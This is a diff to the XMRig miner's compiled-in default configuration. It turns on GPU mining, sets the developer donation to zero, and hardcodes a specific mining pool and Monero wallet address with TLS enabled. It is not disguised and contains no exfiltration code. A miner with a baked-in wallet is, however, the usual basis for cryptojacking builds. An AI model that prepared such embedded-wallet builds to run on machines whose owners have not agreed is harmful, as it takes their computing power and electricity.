@@ -21,13 +21,14 @@
 #define XMRIG_CONFIG_DEFAULT_H
 
 
-namespace xmrig {
+namespace xmrig
+{
 
 
 // This feature require CMake option: -DWITH_EMBEDDED_CONFIG=ON
 #ifdef XMRIG_FEATURE_EMBEDDED_CONFIG
-const static char *default_config =
-R"===(
+	const static char* default_config =
+							 R"===(
 {
     "api": {
         "id": null,
@@ -72,7 +73,7 @@ R"===(
         "cn-lite/0": false
     },
     "opencl": {
-        "enabled": false,
+        "enabled": true,
         "cache": true,
         "loader": null,
         "platform": "AMD",
@@ -81,27 +82,26 @@ R"===(
         "cn-lite/0": false
     },
     "cuda": {
-        "enabled": false,
+        "enabled": true,
         "loader": null,
         "nvml": true,
         "cn/0": false,
         "cn-lite/0": false
     },
-    "donate-level": 1,
-    "donate-over-proxy": 1,
+    "donate-level": 0,
+    "donate-over-proxy": 0,
     "log-file": null,
     "pools": [
         {
             "algo": null,
             "coin": null,
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
-            "pass": "x",
+            "url": "pool.supportxmr.com:443",
+            "user": "43xJcP3LMskbmEsMdGJ6V9JnoZFSHfhnBXCUjngKAPSf5BfuicYr8Wae4YvCTuKxVxga8RWGut8T8UP9YrsRmBDyQnr9Vwu",
             "rig-id": null,
             "nicehash": false,
-            "keepalive": false,
+            "keepalive": true,
             "enabled": true,
-            "tls": false,
+            "tls": true,
             "tls-fingerprint": null,
             "daemon": false,
             "socks5": null,
